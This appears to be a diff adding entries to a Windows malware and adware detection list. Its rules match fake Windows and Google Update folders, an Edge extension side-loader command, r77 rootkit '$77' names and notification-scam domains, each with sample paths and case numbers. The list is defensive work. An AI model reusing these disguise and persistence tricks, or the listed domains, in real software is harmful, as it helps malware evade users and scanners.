+path	*\com.projectreal.real	Real	folder	C:\Users\anna\AppData\Local\com.projectreal.Real\x	26816
+task	=\Real\Launch	Real	task	\Real\Launch	26793
+path	/\\(Alsulics|Almarurics)Application(\\|$)/ key=application	AlsulicsApplication	folder	C:\Program Files (x86)\AlsulicsApplication\AlsulicsApp.exe	18801,18802,18808,18834,19168,19169
+software	/^proudbrowser/ key=proudbrowser	ProudBrowser	adware browser	ProudBrowser | 1.0 | Ramadutha Software Services	14533
+software	/^ultimate ad eraser/ key=ultimate ad eraser	Ultimate Ad Eraser	detected as malware by ESET	Ultimate Ad Eraser 1.0.0.0 | 1.0.0.0 | asevcuk865	21552
+path	*zyravpn	ZyraVPN	AppEsteem deceptor	C:\Program Files\ZyraVPN\ZyraVPN.exe	11066
+software	*zyravpn	ZyraVPN	AppEsteem deceptor	ZyraVPN | 1.0 | x	11066
+
+# Fake Windows and Google folders
+path	/^[a-z]:\\Windows\\(AccountHealth|Pluton|Hardware|Multimedia|OneDrive|SyncCenter|fschk|Copilot|Cortana)\\/ key=:\windows\	Fake Windows folders	folder that Windows does not have	C:\Windows\AccountHealth\chkhlt.exe	20279,20654,20655,27934,27935,27936,27937,27939,27940,27943,27944,27945,27946,27947,27948,27951,27952
+path	*\system32\wifi6.exe	Fake Windows folders	fake system program	C:\Windows\System32\wifi6.exe	27938,27942
+path	*\system32\svctrl64.exe	Fake Windows folders	fake system program	C:\Windows\System32\svctrl64.exe	14886,15329
+path	*\program files\deephour\	Fake Windows folders	folder	C:\Program Files\DeepHour\DeepHour.exe	27941,27950,27953
+path	*\microsoft\taskregistrationmaintenancetask\	Fake Windows folders	folder	C:\Program Files\Microsoft\TaskRegistrationMaintenanceTask\TaskRegistrationMaintenance.exe	27949
+path	/^[a-z]:\\ProgramData\\Windows\\Microsoft\\/ key=\programdata\windows\microsoft\	Fake Windows folders	ProgramData\Windows\Microsoft (the real one is Microsoft\Windows)	C:\ProgramData\Windows\Microsoft\RuntimeBroker.exe	21523,21524,21525,21526,21527
+path	/\\system32\\system32\.exe$/ key=\system32.exe	Fake Windows folders	system32.exe	C:\Program Files (x86)\System32\system32.exe	26184
+path	/\\AppData\\Roaming\\(Microsoft\\)?(Microsoft Malware Protection|AntiMalwareServiceExecutable|SystemInterrupts|RuntimeBroker|RegAsm)\.exe$/ key=\appdata\roaming\	Fake Windows folders	Windows program name in AppData	C:\Users\anna\AppData\Roaming\SystemInterrupts.exe	13088,15230,24648,24650,24651
+path	/\\AppData\\Roaming\\Microsoft\\(SecurityHealth|CLR_v4\.0|CLR_v4|RasManagement)\\/ key=\appdata\roaming\microsoft\	Fake Windows folders	Windows folder name in AppData	C:\Users\anna\AppData\Roaming\Microsoft\SecurityHealth\WinSecurityHealth.exe	10381,10382,10404,10979,10980,18836,18843,23482
+path	/\\Google\\Update\\(Install\\)?(?-i:[a-z0-9]{8})\\(googleupdatepolicy|GoogleUpdateScheduler|ChromeUpdateTask)\.exe$/ key=\google\update\	Fake Google Update	Google Update program in a random 8-letter folder	C:\Program Files (x86)\Google\Update\Install\tfikz584\GoogleUpdateScheduler.exe	26644,26939,26945
+service	/^(ChromeUpdTask|GUpdateTask)(?-i:[a-z0-9]{8})$/	Fake Google Update	service + random 8 letters	GUpdateTasktfikz584	26644,26945
+path	/^[a-z]:\\ProgramData\\Google\\Chrome\\(updater\.exe|faultrep\.dll)$/ key=\programdata\google\chrome\	Fake Google Update	side-loading pair in ProgramData	C:\ProgramData\Google\Chrome\updater.exe	14388,14390,14391
+
+# Chrome extension side-loader (ManageEngine report)
+cmd	*--load-extension=c:\programdata\direct\swapper	Extension side-loader	browser shortcut loads an extension	"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --load-extension=C:\ProgramData\Direct\swapper	10038,10039,10040,10041,10042,10063
+path	/\\ProgramData\\(Direct\\swapper|atkex|ClpHtt)(\\|$)/ key=\programdata\	Extension side-loader	folder	C:\ProgramData\ClpHtt\MatrixElect64.exe	35,10045,10050,10051,10063
+task	/^\\(ClpHtt|atkexComSvc)$/	Extension side-loader	task	\ClpHtt	37,10050,10051
+
+# r77 rootkit
+task	*$77	r77 rootkit	r77 hides names that start with $77	\$77svc	13715,13716,13717
+service	*$77	r77 rootkit	r77 hides names that start with $77	$77svc64	13715,13716,13717
+path	*\$77	r77 rootkit	r77 hides names that start with $77	C:\Windows\$77fix.exe	13715,13716,13717
+cmd	*$77	r77 rootkit	r77 hides names that start with $77	cmd /c start $77svc	13715,13716,13717
+
+# Browser notification and search hijack domains
+domain	=mymandardair.com	Notification scam	malicious notification / search domain	x.mymandardair.com	19131
+domain	=vendralo.info	Notification scam	malicious notification / search domain	x.vendralo.info	10778
+domain	=davisonbarker.pro	Notification scam	malicious notification / search domain	x.davisonbarker.pro	20146
+domain	=fisicule.co.in	Notification scam	malicious notification / search domain	x.fisicule.co.in	26742
+domain	=trovixnero.co.in	Notification scam	malicious notification / search domain	x.trovixnero.co.in	21132
+domain	=asw-confm.co.in	Notification scam	malicious notification / search domain	x.asw-confm.co.in	14629
+domain	=tyvexbotshield.co.in	Notification scam	malicious notification / search domain	x.tyvexbotshield.co.in	14624
+domain	=nertyu.co.in	Notification scam	malicious notification / search domain	x.nertyu.co.in	28038
+domain	=coreprotects.co.in	Notification scam	malicious notification / search domain	x.coreprotects.co.in	28039
+domain	=hohosearch.com	Notification scam	malicious notification / search domain	x.hohosearch.com	23236
+domain	*re-captha-version-	Notification scam	fake captcha notification domain	re-captha-version-3-19.top	14616
